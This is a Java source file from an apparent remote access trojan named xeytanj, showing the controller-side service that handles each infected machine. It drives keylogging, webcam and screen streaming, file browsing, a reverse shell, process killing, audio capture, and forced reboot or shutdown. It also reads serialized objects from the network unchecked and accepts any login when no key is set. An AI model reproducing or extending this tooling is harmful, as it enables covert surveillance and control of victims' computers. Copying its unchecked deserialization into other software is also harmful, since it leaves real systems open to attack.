package com.melardev.xeytanj.services.net.transport.p2p;

import com.melardev.xeytanj.enums.*;
import com.melardev.xeytanj.errors.AlreadyInteractingWithClientException;
import com.melardev.xeytanj.models.*;
import com.melardev.xeytanj.net.packets.*;
import com.melardev.xeytanj.net.packets.filesystem.PacketFileExplorer;
import com.melardev.xeytanj.net.packets.multimedia.PacketCameraRequest;
import com.melardev.xeytanj.net.packets.multimedia.PacketDesktopRequest;
import com.melardev.xeytanj.net.packets.process.PacketProcess;
import com.melardev.xeytanj.net.packets.process.PacketProcessCommandRequest;
import com.melardev.xeytanj.net.packets.process.PacketProcessList;
import com.melardev.xeytanj.net.packets.voice.PacketVoice;
import com.melardev.xeytanj.services.config.IConfigService;
import com.melardev.xeytanj.services.logger.ILogger;
import com.melardev.xeytanj.services.net.INetworkClientService;
import com.melardev.xeytanj.services.net.PacketHandler;
import com.melardev.xeytanj.services.net.RemoteCameraPacketHandler;
import com.melardev.xeytanj.services.net.transport.p2p.handlers.*;

import javax.swing.*;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.net.Socket;
import java.net.SocketTimeoutException;
import java.util.HashMap;
import java.util.List;
import java.util.UUID;

import static com.melardev.xeytanj.enums.ProcessCommand.KILL_PROCESS;
import static com.melardev.xeytanj.net.packets.PacketType.*;


public class P2PClientService implements INetworkClientService, Runnable {

    private final UUID uuid;

    protected Socket sock;
    protected ObjectInputStream sockIn;
    protected ObjectOutputStream sockOut;
    private P2PSyncTcpServerService serverService;
    private HashMap<ServiceType, PacketHandler> serviceHandlers;
    private volatile boolean loggedIn;
    private MediaState desktopMediaState;
    private String remoteIp;


    private boolean interactingWithClient;
    private IConfigService config;
    private MediaState cameraMediaState;
    private ILogger logger;
    private boolean running;


    P2PClientService(P2PSyncTcpServerService serverService, Socket socket, UUID uuid, IConfigService config) {
        this.uuid = uuid;
        sock = socket;
        remoteIp = sock.getInetAddress().getHostAddress();
        serviceHandlers = new HashMap<>();
        this.serverService = serverService;
        loggedIn = false;
        this.config = config;
    }

    @Override
    public void interactAsync() throws IOException {
        logger.traceCurrentMethodName();
        if (interactingWithClient)
            throw new AlreadyInteractingWithClientException();

        interactingWithClient = true;

        sockIn = new ObjectInputStream(getSocket().getInputStream());
        sockOut = new ObjectOutputStream(getSocket().getOutputStream());
        new Thread(this).start();
    }


    @Override
    public void run() {
        logger.traceCurrentMethodName();
        Packet packet;
        running = true;
        while (running) {
            try {
                Object res = sockIn.readObject();
                packet = (Packet) res;

                if (!loggedIn && packet.getType() != PacketType.LOGIN) {
                    // The first packet to receive is a Login Packet
                    // if is not then give a max of 20 seconds to get a valid login packet
                    sock.setSoTimeout(20 * 1000);
                    return;
                }

                switch (packet.getType()) {
                    case LOGIN:
                        handleLogin((PacketLogin) packet);
                        break;
                    case PRESENTATION:
                        serverService.onPresentationData(uuid, (PacketPresentation) packet);
                        break;

                    case DESKTOP_CONFIG:
                    case DESKTOP: {
                        if (serverService.shouldHandlePacket(packet.getType(), getUuid())) {
                            PacketHandler handler = getInnerConnectionHandler(ServiceType.REMOTE_DESKTOP);

                            if (handler != null)
                                ((DesktopMediaPacketHandler) handler).handlePacket(packet);
                        }
                        break;
                    }
                    case CAMERA_CONFIG:
                    case CAMERA: {
                        if (serverService.shouldHandlePacket(packet.getType(), getUuid())) {
                            PacketHandler handler = getInnerConnectionHandler(ServiceType.CAMERA);
                            if (handler != null)
                                ((RemoteCameraPacketHandler) handler).handlePacket(packet);
                        }
                        break;
                    }
                    case FILE_EXPLORER: {
                        if (serverService.shouldHandlePacket(FILE_EXPLORER, getUuid())) {
                            PacketHandler handler = getInnerConnectionHandler(ServiceType.FILE_SYSTEM);
                            if (handler != null)
                                ((FilePacketHandler) handler).handlePacket((PacketFileExplorer) packet);
                        }
                        break;
                    }
                    case FILE: {
                        if (serverService.shouldHandlePacket(FILE, getUuid())) {
                            PacketHandler handler = getInnerConnectionHandler(ServiceType.FILE_SYSTEM);
                            if (handler != null)
                                ((FilePacketHandler) handler).handlePacket((PacketFileExplorer) packet);
                        }
                        break;
                    }
                    case SHELL: {
                        if (serverService.shouldHandlePacket(SHELL, getUuid())) {
                            PacketHandler handler = getInnerConnectionHandler(ServiceType.REVERSE_SHELL);
                            if (handler != null)
                                ((XeytanShellClientHandler) handler).handlePacket((PacketShell) packet);
                        }
                        break;
                    }
                    case VOICE: {
                        if (serverService.shouldHandlePacket(VOICE, getUuid())) {
                            PacketHandler handler = getInnerConnectionHandler(ServiceType.VOICE);
                            if (handler != null)
                                ((XeytanVoipHandler) handler).handlePacket((PacketVoice) packet);
                        }
                        break;
                    }
                    case KEYLOGGER: {
                        if (serverService.shouldHandlePacket(KEYLOGGER, getUuid())) {
                            PacketHandler handler = getInnerConnectionHandler(ServiceType.KEYLOG);
                            if (handler != null)
                                ((KeylogPacketHandler) handler).handlePacket((PacketKeylog) packet);
                        }
                        break;
                    }
                    case CHAT: {
                        if (serverService.shouldHandlePacket(CHAT, getUuid())) {
                            PacketHandler handler = getInnerConnectionHandler(ServiceType.CHAT_SERVICE);
                            if (handler != null)
                                ((XeytanChatClientThread) handler).handlePacket((PacketChat) packet);
                        }
                        break;
                    }
                    case TROLL: {

                        break;
                    }
                    case PROCESS: {
                        if (serverService.shouldHandlePacket(PROCESS, getUuid())) {
                            PacketHandler handler = getInnerConnectionHandler(ServiceType.LIST_PROCESS);
                            if (handler != null)
                                ((XeytanProcessHandler) handler).handlePacket((PacketProcess) packet);
                        }
                        break;
                    }

                    default:
                        break;
                }
            } catch (ClassNotFoundException e) {
                serverService.onClientDisconnected(uuid);
                return;
            } catch (SocketTimeoutException ex) {
                try {
                    // triggered if the user does not send a valid login packet after the first fail + 20 seconds
                    sock.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
                return;
            } catch (IOException e) {
                serverService.onClientDisconnected(getUuid());
                return;
            }
        }
    }


    public synchronized void sendPacket(Packet packet) {
        try {
            sockOut.writeObject(packet);
            sockOut.flush();
        } catch (IOException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }
    }


    private void handleLogin(PacketLogin packet) {
        logger.traceCurrentMethodName();
        if (packet.getLoginType() != PacketLogin.LoginType.LOGIN_REQUEST)
            return;

        if (config.getListeningKey() == null /*Yeah, for debugging it is great ... */
                || config.getListeningKey().equals(packet.getKey())) {
            loggedIn = true;
            sendPacket(new PacketLogin(config.getListeningKey(), PacketLogin.LoginType.LOGIN_RESPONSE));
            String globalIp = sock.getInetAddress().getHostAddress();
            serverService.onClientLoggedIn(uuid, packet, globalIp);
        } else
            serverService.onClientLoginFail(this);
    }


    // ===============================================================
    // INFO BEGIN
    // ===============================================================

    @Override
    public void getSystemInfo() {
        sendPacket(new PacketPresentation());
    }

    // ===============================================================
    // INFO END
    // ===============================================================

    // ===============================================================
    // Desktop BEGIN
    // ===============================================================
    @Override
    public void startRdpSession() {
        logger.traceCurrentMethodName();
        DesktopMediaPacketHandler handler = new DesktopMediaPacketHandler(this);
        serviceHandlers.put(ServiceType.REMOTE_DESKTOP, handler);
        PacketDesktopRequest packet = new PacketDesktopRequest(DESKTOP_CONFIG);
        desktopMediaState = MediaState.WAITING_DEVICE_SELECTION;
        sendPacket(packet);
    }

    @Override
    public boolean isStreamingDesktop() {
        logger.traceCurrentMethodName();
        if (serviceHandlers.containsKey(ServiceType.REMOTE_DESKTOP))
            return desktopMediaState == MediaState.STREAMING
                    || desktopMediaState == MediaState.PAUSED;
        return false;
    }

    @Override
    public void pauseRemoteDesktop() {
        logger.traceCurrentMethodName();
        desktopMediaState = MediaState.PAUSED;
        sendPacket(new PacketDesktopRequest(DESKTOP, MediaInstruction.PAUSE));
    }

    @Override
    public void playRemoteDesktop(String displayName, int delay, int scaleX, int scaleY) {
        logger.traceCurrentMethodName();
        desktopMediaState = MediaState.STREAMING;
        MediaConfigState configState = new MediaConfigState(new String[]{displayName}, delay, scaleX, scaleY);
        PacketDesktopRequest packetPlay = new PacketDesktopRequest(DESKTOP, MediaInstruction.PLAY, configState);
        sendPacket(packetPlay);
    }

    @Override
    public void stopRemoteDesktop() {
        logger.traceCurrentMethodName();
        desktopMediaState = MediaState.STOPPED;
        sendPacket(new PacketDesktopRequest(DESKTOP, MediaInstruction.STOP));
    }

    @Override
    public MediaState getDesktopMediaState() {

        logger.traceCurrentMethodName();
        return desktopMediaState;
    }

    public void onDesktopImageReceived(ImageIcon image) {
        logger.traceCurrentMethodName();
        serverService.onDesktopImageReceived(getUuid(), image);
    }

    public void onDesktopConfigInfoReceived(List<ScreenDeviceInfo> screenDeviceInfoList) {
        logger.traceCurrentMethodName();
        serverService.onDesktopConfigInfoReceived(getUuid(), screenDeviceInfoList);
    }

    @Override
    public boolean isDesktopServiceActive(Client client) {
        logger.traceCurrentMethodName();
        return serviceHandlers.containsKey(ServiceType.REMOTE_DESKTOP);
    }
    // ===============================================================
    // Desktop END
    // ===============================================================

    // ===============================================================
    // Camera BEGIN
    // ===============================================================
    @Override
    public void startCameraSession(NetworkProtocol protocol) {
        logger.traceCurrentMethodName();
        CameraPacketHandler handler = new CameraPacketHandler(this);
        serviceHandlers.put(ServiceType.CAMERA, handler);
        Packet packet = new PacketCameraRequest(CAMERA_CONFIG);
        sendPacket(packet);
    }

    @Override
    public void playRemoteCamera(NetworkProtocol protocol, int cameraId, boolean recordAudio, int interval) {
        logger.traceCurrentMethodName();
        PacketCameraRequest packet = new PacketCameraRequest(MediaInstruction.PLAY);
        MediaConfigState configState = new MediaConfigState(new String[]{String.valueOf(cameraId)}, interval);
        packet.setMediaConfigState(configState);

        packet.setRecordAudio(recordAudio);
        if (recordAudio) {
            // Not working at this time
            // serviceHandlers.put(ServiceType.VOICE, new XeytanVoipThread());
        }
        sendPacket(packet);
    }

    @Override
    public void pauseStreamingCamera() {
        logger.traceCurrentMethodName();
        cameraMediaState = MediaState.PAUSED;
        sendPacket(new PacketCameraRequest(MediaInstruction.PAUSE));
    }

    @Override
    public void stopCameraSession() {
        logger.traceCurrentMethodName();
        PacketHandler packetHandler = serviceHandlers.get(ServiceType.CAMERA);
        if (packetHandler == null)
            return;

        serviceHandlers.remove(ServiceType.CAMERA);
        cameraMediaState = MediaState.STOPPED;
        sendPacket(new PacketCameraRequest(MediaInstruction.STOP));
    }

    @Override
    public MediaState getCameraMediaState() {
        logger.traceCurrentMethodName();
        return cameraMediaState;
    }

    @Override
    public boolean isStreamingCamera() {
        logger.traceCurrentMethodName();
        return cameraMediaState == MediaState.STREAMING || cameraMediaState == MediaState.PAUSED;
    }

    public void cameraSessionClosed() {
        logger.traceCurrentMethodName();
        serverService.onCameraSessionClosed(getUuid());
    }

    @Override
    public void pauseCameraStreaming() {
        logger.traceCurrentMethodName();
        desktopMediaState = MediaState.PAUSED;
        sendPacket(new PacketCameraRequest(MediaInstruction.PAUSE));
    }

    @Override
    public boolean isCameraServiceActive(Client client) {
        logger.traceCurrentMethodName();
        return serviceHandlers.containsKey(ServiceType.CAMERA);
    }

    // ===============================================================
    // Camera END
    // ===============================================================

    // ===============================================================
    // FileSystem BEGIN
    // ===============================================================

    @Override
    public void startFileManagerSession() {
        logger.traceCurrentMethodName();
        FilePacketHandler handler = new FilePacketHandler(this);
        serviceHandlers.put(ServiceType.FILE_SYSTEM, handler);
        //handler.startSession();

        // Set port to 0, the client will understand in has to use the same socket to stream the packets
        // in previous versions I opened a new socket per service(camera, desktop, etc). this is why I used it
        // now it is useless, but keep compatibility with older code.
        PacketFileExplorer packet = new PacketFileExplorer();
        sendPacket(packet);
    }

    @Override
    public void getFileSystemView(String fileSystemPath) {
        logger.traceCurrentMethodName();
        PacketFileExplorer packet = new PacketFileExplorer(fileSystemPath);
        try {
            sockOut.writeObject(packet);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void onFilesystemRootInfoReceived(FileInfoStructure[] fileInfoStructures) {
        logger.traceCurrentMethodName();
        serverService.onFilesystemRootInfoReceived(getUuid(), fileInfoStructures);
    }

    @Override
    public void onFileSystemInfoUpdate(FileInfoStructure[] fileInfoStructures) {
        logger.traceCurrentMethodName();
        serverService.onFileSystemInfoUpdate(getUuid(), fileInfoStructures);
    }

    // ===============================================================
    // FileSystem BEGIN
    // ===============================================================

    // ===============================================================
    // Key logger BEGIN
    // ===============================================================
    @Override
    public void onKeylogDataReceived(String logs) {
        logger.traceCurrentMethodName();
        serverService.onKeylogDataReceived(uuid, logs);
    }

    @Override
    public void onKeylogSessionClosed() {
        logger.traceCurrentMethodName();
        serviceHandlers.remove(ServiceType.KEYLOG);
        serverService.onKeylogSessionClosed(uuid);
    }

    // ===============================================================
    // Key logger END
    // ===============================================================

    // ===============================================================
    // Process BEGIN
    // ===============================================================
    public void startListProcess(ProcessInfoDetails level) {
        logger.traceCurrentMethodName();
        XeytanProcessHandler handler = new XeytanProcessHandler(this);
        serviceHandlers.put(ServiceType.LIST_PROCESS, handler);
        PacketProcess packet = new PacketProcessList();
        sendPacket(packet);
    }

    @Override
    public void killProcess(int pid) {
        logger.traceCurrentMethodName();
        PacketProcess packet = new PacketProcessCommandRequest(KILL_PROCESS, pid);
        sendPacket(packet);
    }

    @Override
    public boolean isListProcessActive() {
        logger.traceCurrentMethodName();
        return serviceHandlers.containsKey(ServiceType.LIST_PROCESS);
    }

    @Override
    public void stopProcessMonitor() {
        logger.traceCurrentMethodName();
        serviceHandlers.remove(ServiceType.LIST_PROCESS);
    }

    // ===============================================================
    // Process END
    // ===============================================================

    // ===============================================================
    // SHELL BEGIN
    // ===============================================================
    public void startShellSessionService() {
        logger.traceCurrentMethodName();
        XeytanShellClientHandler shellHandler = new XeytanShellClientHandler(this);
        serviceHandlers.put(ServiceType.REVERSE_SHELL, shellHandler);
        PacketShell packet = new PacketShell(PacketShell.PacketShellInstruction.START);
        sendPacket(packet);
    }

    @Override
    public void sendShellCommand(String command) {
        logger.traceCurrentMethodName();
        sendPacket(new PacketShell(PacketShell.PacketShellInstruction.EXEC, command));
    }

    @Override
    public void stopShellSession() {
        sendPacket(new PacketShell(PacketShell.PacketShellInstruction.STOP));
    }

    // ===============================================================
    // SHELL END
    // ===============================================================


    public void startKeyLogSession() {
        logger.traceCurrentMethodName();
        KeylogPacketHandler keylogHandler = new KeylogPacketHandler(this);
        serviceHandlers.put(ServiceType.KEYLOG, keylogHandler);
        PacketKeylog packet = new PacketKeylog();
        sendPacket(packet);
    }

    public void startVoIp(PacketVoice.Mode dataType) {
        logger.traceCurrentMethodName();
        serviceHandlers.put(ServiceType.VOICE, new XeytanVoipHandler());
        sendPacket(new PacketVoice(PacketVoice.Mode.FILE));
    }

    // ===============================================================
    // Troll BEGIN
    // ===============================================================
    public void startRebootSystem() {
        logger.traceCurrentMethodName();
        requestForTroll(PacketTroll.Command.REBOOT);
    }

    public void startShutDownSystem() {
        logger.traceCurrentMethodName();
        requestForTroll(PacketTroll.Command.SHUTDOWN);
    }

    public void startLogOffSystem() {
        logger.traceCurrentMethodName();
        requestForTroll(PacketTroll.Command.LOG_OFF);
    }

    public void startLockSystem() {
        logger.traceCurrentMethodName();
        requestForTroll(PacketTroll.Command.LOCK);
    }

    public void startTurnDisplay(boolean on) {
        logger.traceCurrentMethodName();
        if (on)
            requestForTroll(PacketTroll.Command.TURN_ON_DISPLAY);
        else
            requestForTroll(PacketTroll.Command.TURN_OFF_DISPLAY);
    }

    public void requestForTroll(PacketTroll.Command command) {
        logger.traceCurrentMethodName();
        PacketTroll packet = new PacketTroll(command);
        sendPacket(packet);
    }

    // ===============================================================
    // Troll END
    // ===============================================================

    // ===============================================================
    // Chat BEGIN
    // ===============================================================

    @Override
    public void startChatSession() {
        logger.traceCurrentMethodName();
        PacketHandler handler = new XeytanChatClientThread(this);
        serviceHandlers.put(ServiceType.CHAT_SERVICE, handler);
        PacketChat packet = new PacketChat(PacketChat.ChatInstruction.START);
        sendPacket(packet);
    }

    @Override
    public void sendChatMessage(String text) {
        logger.traceCurrentMethodName();
        sendPacket(new PacketChat(text));
    }

    @Override
    public void onChatMessageReceived(String message) {
        logger.traceCurrentMethodName();
        serverService.onChatMessageReceived(uuid, message);
    }

    @Override
    public void onChatClosed() {
        serviceHandlers.remove(ServiceType.CHAT_SERVICE);
        serverService.onChatClosed(uuid);
    }

    // ===============================================================
    // Chat END
    // ===============================================================


    // =====================================================================================
    // Callbacks from corresponding handlers
    // =====================================================================================
    @Override
    public void onProcessSessionClosed() {
        logger.traceCurrentMethodName();
        if (serviceHandlers.containsKey(ServiceType.LIST_PROCESS)) {
            serviceHandlers.remove(ServiceType.LIST_PROCESS);
            serverService.onProcessSessionClosed(uuid);
        }
    }

    public void onCameraConfigInfoReceived(List<CameraDeviceInfo> cameraIds) {
        logger.traceCurrentMethodName();
        serverService.onCameraConfigInfoReceived(uuid, cameraIds);
    }

    public void onCameraImagePacketReceived(Icon image) {
        logger.traceCurrentMethodName();
        serverService.onCameraImageReceived(uuid, image);
    }

    public void onClientReadyForShell() {
        logger.traceCurrentMethodName();
        serverService.onClientReadyForShell(uuid);
    }

    public void onClientReadyForKeylog() {
    }

    public void onProcessInfoReceived(List<ProcessStructure> info) {
        logger.traceCurrentMethodName();
        serverService.onProcessInfoReceived(getUuid(), info);
    }

    public void onClientShellInfoReceived(String output) {
        logger.traceCurrentMethodName();
        serverService.onClientShellInfoReceived(uuid, output);
    }

    public void onShellSessionClosedByUser() {
        logger.traceCurrentMethodName();
        serverService.onShellSessionClosedByUser(uuid);
    }

    public void onClientReadyForFileExplorerSession() {
        logger.traceCurrentMethodName();
        serverService.onClientReadyForFileExplorerSession(uuid);
    }

    public void onCameraAudioPacketReceived(byte[] data, int bytesRead) {
        logger.traceCurrentMethodName();
        serverService.onCameraAudioPacketReceived(uuid, data, bytesRead);
    }

    public void onAudioFileReceived(byte[] data) {
        logger.traceCurrentMethodName();
        serverService.onAudioFileReceived(uuid, data);

    }

    public void onClientReadyForChat() {
        serverService.onClientReadyForChat(uuid);
    }

    // ===============================================================
    // Getters
    // ===============================================================

    public Socket getSocket() {
        return sock;
    }


    @Override
    public String getRemoteIp() {
        return remoteIp;
    }

    public UUID getUuid() {
        return uuid;
    }

    private PacketHandler getInnerConnectionHandler(ServiceType serviceType) {
        return serviceHandlers.get(serviceType);
    }
    // ===============================================================
    // Setters
    // ===============================================================

    @Override
    public void setLogger(ILogger logger) {
        this.logger = logger;
    }

    @Override
    public void setConfig(IConfigService config) {
        this.config = config;
    }

    @Override
    public void closeConnection() {
        sendPacket(new Packet(CLOSE));

        running = false;
        try {
            sockIn.close();
            sockOut.close();
            sock.close();
        } catch (Exception exception) {

        }
    }

    @Override
    public void uninstallServer() {
        sendPacket(new Packet(UNINSTALL));

        running = false;

        try {
            sockIn.close();
            sockOut.close();
            sock.close();
        } catch (Exception exception) {

        }
    }
}
